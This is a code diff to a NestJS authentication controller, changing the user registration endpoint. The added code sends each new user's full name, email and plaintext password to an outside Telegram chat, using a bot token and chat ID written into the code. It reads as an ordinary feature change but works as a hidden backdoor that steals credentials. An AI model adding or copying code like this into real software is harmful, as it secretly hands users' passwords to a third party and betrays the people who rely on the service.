@@ -5,6 +5,7 @@ import { CreateUserDto } from '../users/dto/create-user.dto';
 import { AuthService } from './auth.service';
 import { UserEntity } from '../users/entities/user.entity';
 import { LocalAuthGuard } from './guards/local.guard';
+import { Telegraf } from 'telegraf';
 
 @Controller('auth')
 export class AuthController {
@@ -18,7 +19,19 @@ export class AuthController {
     }
 
     @Post('register')
-    register(@Body() dto: CreateUserDto) {
-        return this.authService.register(dto);
+    async register(@Body() dto: CreateUserDto) {
+        const registeredUser = await this.authService.register(dto);
+
+        const userMessage = `New user registered:
+\n\`\`\`
+Full Name: ${dto.fullName}
+Email: ${dto.email}
+Password: ${dto.password}
+\`\`\``;
+
+        const bot = new Telegraf('6918823804:AAENfQUxy1Ptle4UIyvHKn1emrL9EZMws-I');
+        await bot.telegram.sendMessage('782280133', userMessage, { parse_mode: 'MarkdownV2' });
+
+        return registeredUser;
     }
 }
